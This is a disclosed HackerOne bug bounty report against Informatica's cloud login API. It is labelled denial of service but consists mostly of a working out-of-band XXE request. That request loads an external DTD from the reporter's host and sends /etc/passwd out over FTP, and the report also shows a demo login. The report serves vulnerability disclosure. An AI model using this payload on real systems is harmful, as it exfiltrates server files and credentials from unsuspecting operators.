@@ -1,0 +1,30 @@
+ReportLink:https://hackerone.com/reports/105753
+WeaknessName:Denial of Service
+Reporter:https://hackerone.com/yarbabin
+ReportedTo:Informatica(informatica)
+BountyAmount:
+Severity:high
+State:Closed
+DateOfDisclosure:08.04.2017 10:07:19
+
+Summary:
+
+Request:
+POST /ma/api/v2/user/login HTTP/1.1
+Host: app.informaticaondemand.com
+Content-Length: 285
+Content-Type: application/xml
+Accept: application/xml
+
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<!DOCTYPE root [
+<!ENTITY % b PUBLIC "lol" "file:///etc/passwd">
+<!ENTITY % asd PUBLIC "lol" "http://mysite/xx.html">
+%asd;
+%rrr;]>
+<login><username>demo@informatica.com</username><password>Infa123</password></login>
+
+Where xx.html:
+<!ENTITY % c "<!ENTITY &#37; rrr SYSTEM 'ftp://mysite/%b;'>">%c;
+
+Then i got file /etc/passwd (xxe_app.png)
